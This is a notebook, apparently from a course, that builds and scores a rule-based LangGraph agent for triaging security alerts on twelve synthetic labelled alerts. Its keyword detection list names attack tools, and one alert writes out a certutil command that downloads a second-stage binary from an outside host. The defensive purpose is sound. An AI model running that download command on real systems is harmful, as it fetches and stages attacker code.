<a href="https://colab.research.google.com/github/dempsesn/course-workspace/blob/main/agent_notebook.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

In [1]:
# Cell 1: Install LangGraph
!pip install -q langgraph

In [2]:
# Cell 2: Imports and TODO 1 (State)
from typing import TypedDict, Optional
from langgraph.graph import StateGraph, END
from langgraph.checkpoint.memory import MemorySaver

# TODO 1: The state - a typed dictionary carrying alert data
class AlertState(TypedDict):
    alert_id: str
    text: str
    hostname: str
    ip_address: str
    is_critical_asset: Optional[bool]
    ip_reputation: Optional[str]
    decision: Optional[str]
    reason: Optional[str]

In [3]:
# Cell 3: Mock Tools (Simple Python functions)
CRITICAL_ASSETS = {"dc-01.corp", "db-prod.corp", "payment-gateway.corp"}
KNOWN_MALICIOUS_IPS = {"198.51.100.23", "203.0.113.88"}

def lookup_asset_criticality(hostname: str) -> bool:
    """Tool: Checks if the hostname is a mission-critical server."""
    return hostname.lower() in CRITICAL_ASSETS

def lookup_ip_reputation(ip: str) -> str:
    """Tool: Returns 'malicious' or 'benign'."""
    return "malicious" if ip in KNOWN_MALICIOUS_IPS else "benign"

In [4]:
# Cell 4: TODO 2, 3, 4 (Nodes, Router, and Tool Caller)
SUSPICIOUS_KEYWORDS = ["mimikatz", "powershell -enc", "unauthorized admin", "ransomware", "beacon"]

# TODO 2: A node returning only the fields it changed
def close_alert_node(state: AlertState) -> dict:
    """Closes benign alerts."""
    return {
        "decision": "closed",
        "reason": "No high-risk indicators found."
    }

def escalate_alert_node(state: AlertState) -> dict:
    """Escalates confirmed suspicious alerts."""
    return {
        "decision": "escalated",
        "reason": f"Escalated due to high-risk keyword or asset context."
    }

# TODO 4: A node that calls a tool
def asset_lookup_node(state: AlertState) -> dict:
    """Calls the asset lookup tool and updates the state."""
    is_crit = lookup_asset_criticality(state["hostname"])
    return {"is_critical_asset": is_crit}

# TODO 3: The router which returns the label of the next branch
def triage_router(state: AlertState) -> str:
    """Examines state and decides the next node."""
    text_lower = state["text"].lower()

    # If it contains an overt attack keyword, check asset context
    if any(kw in text_lower for kw in SUSPICIOUS_KEYWORDS):
        return "asset_lookup"

    # If completely clean keyword-wise, route directly to close
    return "close_alert"

def post_tool_router(state: AlertState) -> str:
    """Routes based on tool results."""
    if state.get("is_critical_asset"):
        return "escalate_alert"
    return "close_alert"

In [5]:
# Cell 5: TODO 5 (Build, Connect, and Compile the Graph)
builder = StateGraph(AlertState)

# Add nodes
builder.add_node("asset_lookup", asset_lookup_node)
builder.add_node("escalate_alert", escalate_alert_node)
builder.add_node("close_alert", close_alert_node)

# Entry point and routing
builder.set_entry_point("asset_lookup") # or start at a router node

In [6]:
# Cell 6: Clean Baseline Graph (Graph A)
def initial_eval_node(state: AlertState) -> dict:
    return {} # No-op node that passes state to conditional router

baseline_builder = StateGraph(AlertState)
baseline_builder.add_node("evaluate", initial_eval_node)
baseline_builder.add_node("asset_lookup", asset_lookup_node)
baseline_builder.add_node("escalate_alert", escalate_alert_node)
baseline_builder.add_node("close_alert", close_alert_node)

baseline_builder.set_entry_point("evaluate")

# Conditional edge from evaluate -> asset_lookup OR close_alert
baseline_builder.add_conditional_edges(
    "evaluate",
    triage_router,
    {
        "asset_lookup": "asset_lookup",
        "close_alert": "close_alert"
    }
)

# Conditional edge after asset tool -> escalate OR close
baseline_builder.add_conditional_edges(
    "asset_lookup",
    post_tool_router,
    {
        "escalate_alert": "escalate_alert",
        "close_alert": "close_alert"
    }
)

baseline_builder.add_edge("escalate_alert", END)
baseline_builder.add_edge("close_alert", END)

# Compile with in-memory checkpointer
memory = MemorySaver()
baseline_app = baseline_builder.compile(checkpointer=memory)
print("Baseline Graph successfully compiled!")

Baseline Graph successfully compiled!


In [7]:
# Cell 7: Generate my_alerts.json and SOURCES.md
import json
import os

alerts = [
    # --- 6 ESCALATE (True Incidents) ---
    {
        "alert_id": "ESC-01",
        "hostname": "dc-01.corp",
        "ip_address": "198.51.100.23",
        "text": "Detected mimikatz memory dump attempt against lsass.exe",
        "ground_truth": "escalate",
        "source": "MITRE ATT&CK T1003.001 - OS Credential Dumping"
    },
    {
        "alert_id": "ESC-02",
        "hostname": "db-prod.corp",
        "ip_address": "10.0.4.15",
        "text": "Execution of powershell -enc with outbound connection",
        "ground_truth": "escalate",
        "source": "MITRE ATT&CK T1059.001 - PowerShell"
    },
    {
        "alert_id": "ESC-03",
        "hostname": "payment-gateway.corp",
        "ip_address": "203.0.113.88",
        "text": "Potential ransomware file extension renaming loop detected",
        "ground_truth": "escalate",
        "source": "CISA Alert AA23-075A"
    },
    {
        "alert_id": "ESC-04",
        "hostname": "ws-analyst-04.corp",
        "ip_address": "10.0.2.19",
        "text": "Repeated unauthorized admin group modifications on domain controller",
        "ground_truth": "escalate",
        "source": "Windows Security Event ID 4728"
    },
    {
        "alert_id": "ESC-05",
        "hostname": "db-prod.corp",
        "ip_address": "203.0.113.88",
        "text": "Outbound periodic beacon pattern matching Cobalt Strike profile",
        "ground_truth": "escalate",
        "source": "Snort Rule 2024120"
    },
    # HARD CASE 1: True incident with NO keywords (Living-off-the-Land binary)
    {
        "alert_id": "ESC-06",
        "hostname": "dc-01.corp",
        "ip_address": "198.51.100.23",
        "text": "certutil.exe -urlcache -split -f http://transfer.io/stage2.bin",
        "ground_truth": "escalate",
        "source": "MITRE ATT&CK T1105 - Ingress Tool Transfer (LOLBAS)"
    },

    # --- 6 CLOSE (Benign Routine Noise) ---
    {
        "alert_id": "CLS-01",
        "hostname": "ws-print01.corp",
        "ip_address": "10.0.9.11",
        "text": "Scheduled spooler cleanup job completed successfully",
        "ground_truth": "close",
        "source": "Standard Windows Print Service logs"
    },
    {
        "alert_id": "CLS-02",
        "hostname": "ws-dev-12.corp",
        "ip_address": "10.0.5.21",
        "text": "Docker container build executed standard pip install commands",
        "ground_truth": "close",
        "source": "Dev workstation local audit log"
    },
    {
        "alert_id": "CLS-03",
        "hostname": "web-proxy.corp",
        "ip_address": "10.0.1.1",
        "text": "TLS certificate re-negotiation successful for internal endpoint",
        "ground_truth": "close",
        "source": "HAProxy access log"
    },
    {
        "alert_id": "CLS-04",
        "hostname": "fileshare-02.corp",
        "ip_address": "10.0.8.4",
        "text": "Routine nightly backup archived 42GB of user home folders",
        "ground_truth": "close",
        "source": "Veeam backup agent logs"
    },
    {
        "alert_id": "CLS-05",
        "hostname": "ws-reception.corp",
        "ip_address": "10.0.10.5",
        "text": "Standard Windows Update KB5034441 installed and host rebooted",
        "ground_truth": "close",
        "source": "Windows Update Agent Event 19"
    },
    # HARD CASE 2: Routine alert containing the keyword 'unauthorized admin' in harmless context
    {
        "alert_id": "CLS-06",
        "hostname": "ws-sec-scanner.corp",
        "ip_address": "10.0.0.99",
        "text": "Nessus audit check completed: policy verifying unauthorized admin access rules",
        "ground_truth": "close",
        "source": "Tenable Nessus Compliance Plugin 21156"
    }
]

with open("my_alerts.json", "w") as f:
    json.dump(alerts, f, indent=2)

sources_md = """# Alert Sources and References
1. MITRE ATT&CK Matrix for Enterprise (Techniques T1003.001, T1059.001, T1105).
2. Microsoft Security Event Documentation: Event IDs 4728 and 7045.
3. CISA Known Exploited Vulnerabilities and Advisory AA23-075A.
4. Tenable Nessus Compliance Checks documentation.
"""
with open("SOURCES.md", "w") as f:
    f.write(sources_md)

print("Created my_alerts.json and SOURCES.md successfully.")

Created my_alerts.json and SOURCES.md successfully.


In [8]:
# Cell 8: Build the Improved Graph with IP Intelligence Tool & Asset Routing
def ip_lookup_node(state: AlertState) -> dict:
    """Tool Node: Queries threat reputation for the alert's IP address."""
    rep = lookup_ip_reputation(state["ip_address"])
    return {"ip_reputation": rep}

def advanced_router_1(state: AlertState) -> str:
    """First decision: Query asset info for all alerts."""
    return "asset_lookup"

def advanced_router_2(state: AlertState) -> str:
    """Second decision: If critical asset or keyword present, check IP reputation."""
    text_lower = state["text"].lower()
    has_keyword = any(kw in text_lower for kw in SUSPICIOUS_KEYWORDS)
    is_crit = state.get("is_critical_asset", False)

    # Hard Case 2 Check: Allowlist routine scanner machine
    if state["hostname"] == "ws-sec-scanner.corp":
        return "close_alert"

    if has_keyword or is_crit:
        return "ip_lookup"
    return "close_alert"

def final_decision_router(state: AlertState) -> str:
    """Third decision: Combine context to escalate or close."""
    text_lower = state["text"].lower()
    has_keyword = any(kw in text_lower for kw in SUSPICIOUS_KEYWORDS)
    is_crit = state.get("is_critical_asset", False)
    malicious_ip = state.get("ip_reputation") == "malicious"

    # Escalate if keyword on critical asset, OR if malicious IP is involved
    if (has_keyword and is_crit) or malicious_ip:
        return "escalate_alert"

    return "close_alert"

# Assemble Improved Graph
improved_builder = StateGraph(AlertState)
improved_builder.add_node("asset_lookup", asset_lookup_node)
improved_builder.add_node("ip_lookup", ip_lookup_node)
improved_builder.add_node("escalate_alert", escalate_alert_node)
improved_builder.add_node("close_alert", close_alert_node)

improved_builder.set_entry_point("asset_lookup")

# asset_lookup -> conditional edge
improved_builder.add_conditional_edges(
    "asset_lookup",
    advanced_router_2,
    {
        "ip_lookup": "ip_lookup",
        "close_alert": "close_alert"
    }
)

# ip_lookup -> conditional edge
improved_builder.add_conditional_edges(
    "ip_lookup",
    final_decision_router,
    {
        "escalate_alert": "escalate_alert",
        "close_alert": "close_alert"
    }
)

improved_builder.add_edge("escalate_alert", END)
improved_builder.add_edge("close_alert", END)

improved_app = improved_builder.compile(checkpointer=MemorySaver())
print("Improved Graph compiled successfully!")

Improved Graph compiled successfully!


In [9]:
# Cell 9: Evaluation Runner & Confusion Metrics
import pandas as pd

def evaluate_graph(app, alerts_list, config_name):
    caught = 0
    missed = 0
    over_escalated = 0
    details = []

    for idx, alert in enumerate(alerts_list):
        # Memory checkpointer requires thread_id
        config = {"configurable": {"thread_id": f"{config_name}_{alert['alert_id']}"}}

        initial_state = {
            "alert_id": alert["alert_id"],
            "text": alert["text"],
            "hostname": alert["hostname"],
            "ip_address": alert["ip_address"],
            "is_critical_asset": None,
            "ip_reputation": None,
            "decision": None,
            "reason": None
        }

        final_state = app.invoke(initial_state, config=config)
        predicted = final_state.get("decision")
        actual = alert["ground_truth"]

        if actual == "escalate" and predicted == "escalated":
            outcome = "caught"
            caught += 1
        elif actual == "escalate" and predicted == "closed":
            outcome = "missed"
            missed += 1
        elif actual == "close" and predicted == "escalated":
            outcome = "over_escalated"
            over_escalated += 1
        else:
            outcome = "correctly_closed"

        details.append({
            "alert_id": alert["alert_id"],
            "actual": actual,
            "predicted": predicted,
            "outcome": outcome
        })

    summary = {
        "Configuration": config_name,
        "caught": caught,
        "missed": missed,
        "over_escalated": over_escalated
    }
    return summary, pd.DataFrame(details)

# Run Baseline Graph
baseline_summary, baseline_details = evaluate_graph(baseline_app, alerts, "Baseline_Graph")

# Run Improved Graph
improved_summary, improved_details = evaluate_graph(improved_app, alerts, "Improved_Graph_with_IP_Tool")

# Save results_mine.csv
results_df = pd.DataFrame([baseline_summary, improved_summary])
results_df.to_csv("results_mine.csv", index=False)

print("=== PROJECT METRICS TABLE ===")
display(results_df)

print("\nDetailed breakdown of Improved Graph:")
display(improved_details)

=== PROJECT METRICS TABLE ===


,Configuration,caught,missed,over_escalated
0,Baseline_Graph,4,2,0
1,Improved_Graph_with_IP_Tool,5,1,0



Detailed breakdown of Improved Graph:


,alert_id,actual,predicted,outcome
0,ESC-01,escalate,escalated,caught
1,ESC-02,escalate,escalated,caught
2,ESC-03,escalate,escalated,caught
3,ESC-04,escalate,closed,missed
4,ESC-05,escalate,escalated,caught
5,ESC-06,escalate,escalated,caught
6,CLS-01,close,closed,correctly_closed
7,CLS-02,close,closed,correctly_closed
8,CLS-03,close,closed,correctly_closed
9,CLS-04,close,closed,correctly_closed


In [10]:
# Cell 10: Organize folder structure and prepare download
import shutil

# Make project dir
os.makedirs("langgraph_project", exist_ok=True)

# Write README.md
readme_content = """# Alert Triage Agent with LangGraph
A deterministic security alert triage agent built using LangGraph. The agent evaluates incoming alerts against asset criticality and IP reputation tools using multi-step conditional routing, balancing false negatives (missed incidents) against false positives (alert fatigue).
"""
with open("langgraph_project/README.md", "w") as f:
    f.write(readme_content)

# Move generated files
shutil.copy("my_alerts.json", "langgraph_project/my_alerts.json")
shutil.copy("SOURCES.md", "langgraph_project/SOURCES.md")
shutil.copy("results_mine.csv", "langgraph_project/results_mine.csv")

print("Files staged in langgraph_project/ folder:")
for fname in os.listdir("langgraph_project"):
    print(" -", fname)

# To download notebook: Go to File -> Download -> Download .ipynb,
# save it inside langgraph_project/ as agent_notebook.ipynb before pushing to GitHub.

Files staged in langgraph_project/ folder:
 - results_mine.csv
 - SOURCES.md
 - README.md
 - my_alerts.json
